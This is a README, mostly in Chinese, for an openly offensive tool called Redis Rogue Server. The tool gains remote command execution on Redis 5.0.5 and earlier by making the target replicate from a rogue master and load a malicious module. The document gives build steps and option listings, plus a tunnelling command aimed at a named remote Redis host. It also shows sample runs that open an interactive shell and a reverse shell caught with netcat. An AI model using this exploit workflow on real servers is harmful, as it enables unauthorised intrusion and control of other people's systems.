# Redis Rogue Server

Redis 4.x 远程命令执行利用工具，适用于 Redis 5.0.5 及以下版本。该工具通过主从复制加载恶意模块实现 RCE，并支持本地端口映射穿透场景。

__支持交互式 shell 和反向 shell，已增加 cpolar 隧道映射配置。__

## 要求

Python 3.6+

如果需要重新编译 Redis 模块，请安装 `make`。

## 使用方法

编译漏洞模块：

```bash
cd RedisModulesSDK/exp/
make
```

将生成的 `.so` 文件复制到 `redis-rogue-server.py` 同目录。

```
➜ python redis-rogue-server.py -h
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

Usage: redis-rogue-server.py [options]

Options:
  -h, --help             显示帮助信息并退出
  --rhost=REMOTE_HOST    目标 Redis 主机
  --rport=REMOTE_PORT    目标 Redis 端口，默认 6379
  --lhost=SLAVE_HOST     SLAVEOF 使用的地址，可填写公网映射地址
  --lport=SLAVE_PORT     SLAVEOF 使用的端口，默认 21000
  --bind-host=BIND_HOST  本地监听地址，默认 0.0.0.0
  --bind-port=BIND_PORT  本地监听端口，默认 21000
  --exp=EXP_FILE         要加载的 Redis 模块文件，默认 exp.so
  -v, --verbose          显示完整的数据流
  --passwd=PASSWORD      目标 Redis 密码
```

## cpolar 内网映射示例

如果攻击机在内网没有公网 IP，可以通过 cpolar 将本地 `127.0.0.1:21000` 映射到 `31.tcp.cpolar.top:10222`，然后执行：

```bash
python redis-rogue-server.py --rhost node.hackhub.get-shell.com --rport 44007 \
  --lhost 31.tcp.cpolar.top --lport 10222 \
  --bind-host 127.0.0.1 --bind-port 21000
```

其中：

- `--lhost` / `--lport` 指定给目标 Redis 的 SLAVEOF 地址
- `--bind-host` / `--bind-port` 指定本地监听地址，供 cpolar 映射使用

## 示例

### 交互式 shell

```
➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] whoami
[>>] :n0b0dy
[<<] 
```

### Reverse shell

Invoke reverse shell:

```
➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
______         _ _      ______                         _____
| ___ \       | (_)     | ___ \                       /  ___|
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
                                     __/ |
                                    |___/
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 127.0.0.1
Reverse server port: 9999
[info] Reverse shell payload sent.
[info] Check at 127.0.0.1:9999
[info] Unload module...
```

Receive reverse shell:

```
➜ nc -lvvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from localhost.localdomain 39312 received!
whoami
n0b0dy
```

## Thanks

* [RicterZ](https://github.com/RicterZ)'s redis exec module: <https://github.com/RicterZ/RedisModules-ExecuteCommand>
